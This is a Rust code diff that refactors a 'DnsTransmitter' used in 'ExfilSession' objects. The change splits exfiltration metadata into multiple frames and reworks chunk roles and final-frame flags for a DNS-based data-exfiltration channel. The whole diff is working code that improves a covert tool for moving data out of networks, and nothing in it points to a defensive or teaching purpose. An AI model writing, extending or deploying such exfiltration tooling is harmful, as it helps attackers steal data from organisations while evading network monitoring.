@@ -61,10 +61,25 @@ impl DnsTransmitter {
         self.send_frame(session, FrameDescriptor::init(total_frames), None)
     }
 
-    pub fn send_metadata_chunk(&mut self, session: &ExfilSession) -> Result<()> {
-        let payload = build_metadata_payload(session);
-        ensure_payload_within_budget(payload.len())?;
-        self.send_frame(session, FrameDescriptor::chunk(0), Some(&payload))
+    pub fn send_metadata_segments(
+        &mut self,
+        session: &ExfilSession,
+        segments: &[Vec<u8>],
+    ) -> Result<()> {
+        if segments.is_empty() {
+            return Err(anyhow!("metadata segments cannot be empty"));
+        }
+
+        let total = segments.len() as u32;
+        for (idx, segment) in segments.iter().enumerate() {
+            if segment.is_empty() {
+                return Err(anyhow!("metadata segment must not be empty"));
+            }
+            ensure_payload_within_budget(segment.len())?;
+            let descriptor = FrameDescriptor::metadata(idx as u32, total);
+            self.send_frame(session, descriptor, Some(segment.as_slice()))?;
+        }
+        Ok(())
     }
 
     pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
@@ -72,7 +87,7 @@ impl DnsTransmitter {
             .checked_add(1)
             .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
         ensure_payload_within_budget(chunk.len())?;
-        self.send_frame(session, FrameDescriptor::chunk(frame_index), Some(chunk))
+        self.send_frame(session, FrameDescriptor::data(frame_index), Some(chunk))
     }
 
     pub fn send_completion(&mut self, session: &ExfilSession) -> Result<()> {
@@ -197,13 +212,24 @@ impl DnsTransmitter {
     fn envelope_flags(&self, session: &ExfilSession, descriptor: &FrameDescriptor) -> u8 {
         match descriptor.phase {
             FramePhase::Init { .. } => ENVELOPE_FLAG_INIT,
-            FramePhase::Chunk { chunk_index } => {
+            FramePhase::Chunk { counter, role } => {
                 let mut flags = ENVELOPE_FLAG_CHUNK;
-                if chunk_index == 0 {
-                    flags |= ENVELOPE_FLAG_METADATA;
-                }
-                if chunk_index as usize == session.job.total_chunks {
-                    flags |= ENVELOPE_FLAG_FINAL;
+                match role {
+                    ChunkRole::Metadata {
+                        segment_index,
+                        segment_total,
+                    } => {
+                        let total = if segment_total == 0 { 1 } else { segment_total };
+                        flags |= ENVELOPE_FLAG_METADATA;
+                        if segment_index + 1 == total {
+                            flags |= ENVELOPE_FLAG_FINAL;
+                        }
+                    }
+                    ChunkRole::Data => {
+                        if counter as usize == session.job.total_chunks {
+                            flags |= ENVELOPE_FLAG_FINAL;
+                        }
+                    }
                 }
                 flags
             }
@@ -262,9 +288,24 @@ impl FrameDescriptor {
         }
     }
 
-    fn chunk(index: u32) -> Self {
+    fn metadata(segment_index: u32, segment_total: u32) -> Self {
         Self {
-            phase: FramePhase::Chunk { chunk_index: index },
+            phase: FramePhase::Chunk {
+                counter: segment_index,
+                role: ChunkRole::Metadata {
+                    segment_index,
+                    segment_total,
+                },
+            },
+        }
+    }
+
+    fn data(counter: u32) -> Self {
+        Self {
+            phase: FramePhase::Chunk {
+                counter,
+                role: ChunkRole::Data,
+            },
         }
     }
 
@@ -281,7 +322,7 @@ impl FrameDescriptor {
     fn counter_value(&self) -> u32 {
         match self.phase {
             FramePhase::Init { total_frames } => total_frames,
-            FramePhase::Chunk { chunk_index } => chunk_index,
+            FramePhase::Chunk { counter, .. } => counter,
             FramePhase::Complete => 0,
         }
     }
@@ -290,11 +331,20 @@ impl FrameDescriptor {
 #[derive(Clone, Copy)]
 enum FramePhase {
     Init { total_frames: u32 },
-    Chunk { chunk_index: u32 },
+    Chunk { counter: u32, role: ChunkRole },
     Complete,
 }
 
-fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
+#[derive(Clone, Copy)]
+enum ChunkRole {
+    Metadata {
+        segment_index: u32,
+        segment_total: u32,
+    },
+    Data,
+}
+
+pub(crate) fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
     let mut buf = Vec::with_capacity(160);
     buf.push(1); // version
     buf.push(FLAG_HEADER);
